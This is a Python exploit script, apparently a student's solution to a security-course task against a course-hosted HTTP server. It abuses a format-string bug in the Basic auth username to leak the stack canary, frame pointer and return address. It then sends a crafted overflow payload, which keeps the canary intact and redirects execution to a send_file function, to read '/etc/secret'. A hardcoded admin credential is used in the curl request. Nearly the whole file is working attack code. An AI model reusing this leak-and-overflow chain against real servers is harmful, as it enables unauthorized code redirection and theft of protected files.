# pip install requests
import requests
import re
import binascii
import subprocess

def change_endian(input):
    """
    Convert a hex address to little endian
    """
    ret_string = bytearray.fromhex(input)
    ret_string.reverse()
    ret_string = ''.join(format(x, '02x') for x in ret_string)

    return ret_string.upper()

# url = 'http://127.0.0.1:8080/'  # Replace with your API URL
url = 'http://project-2.csec.chatzi.org:8000/'

# Create auth with 31 %08x
auth_string = '%08x ' * 31 + ':'
auth = (auth_string, '') 

response = requests.head(url, auth=auth)

response = response.headers
# print(response)
address_string = re.search(r'Basic realm="Invalid user: (.*?) "', response['WWW-Authenticate']).group(1)
addresses = address_string.split()

canary = addresses[26]
ebp = addresses[29]
return_address = addresses[30]

# print("\n\t Stack Data \n")
# print("Canary : " + canary)
# print("$ebp : " + ebp)
# print("Return address : " + return_address)

# Έχουμε τώρα ότι το offset του buffer (post_data) από τον $ebp είναι -120 
# και ότι το offset της send_file από τον ebp είναι 1569
buffer_offset = -120
send_file_offset = 1581

ebp_dec = int(ebp, 16)
buffer_address_dec = ebp_dec + buffer_offset
buffer_address = hex(buffer_address_dec).replace('0x','')

return_address_dec = int(return_address, 16)
send_file_dec = return_address_dec + send_file_offset
send_file_address = hex(send_file_dec).replace('0x','')

# print("buffer address (post_data) : " + buffer_address)
# print("send file address : " + send_file_address)
# print()
 
canary = canary.replace('00','26')

# η παράμετρος που θα περάσουμε στη send_file (3 words)
param = "/etc/secret".encode("utf-8").hex()
param = param.replace('00','26')

# θέλουμε να γεμίσουμε με padding άλλα 10 words (80)
payload_hex = param                 # add string to pass as parameter on send_file
payload_hex += '26'
payload_hex += 'A'*80               # add 10 random words
payload_hex += change_endian(buffer_address)       # write buffer address on payload
payload_hex += 'A'*8                # write one random word
payload_hex += change_endian(canary)               # write the canary
payload_hex += 'A'*16               # 2 random words
payload_hex += change_endian(ebp)                  # add the ebp
payload_hex += change_endian(send_file_address)    # add send file address 
payload_hex += 'A'*8                # 1 random word 
payload_hex += change_endian(buffer_address)

def convert_zeros(string):
    return string.replace('00', '26')

payload_hex = convert_zeros(payload_hex)

# print("\n\npayload :" + payload_hex)

def hex_to_binary(hex_string):
    binary_txt = binascii.unhexlify(hex_string)
    with open("my_bin", "wb") as f:
        f.write(binary_txt)

hex_to_binary(payload_hex)
curl = "curl -m 3 -s -X POST http://project-2.csec.chatzi.org:8000/ -H 'Content-Length: 0' -u admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96 --data-binary '@my_bin'"
# curl = "curl -m 3 -X POST http://127.0.0.1:8080/ -H 'Content-Length: 0' -u test:029794db6e76cb559613732d7c94b24b360bb6f05879bb99e7765518b55abc57 --data-binary '@my_bin'"

output = subprocess.getstatusoutput(curl)

print("\n\n\n============================================== TASK 3 ==============================================\n\n")
print(output)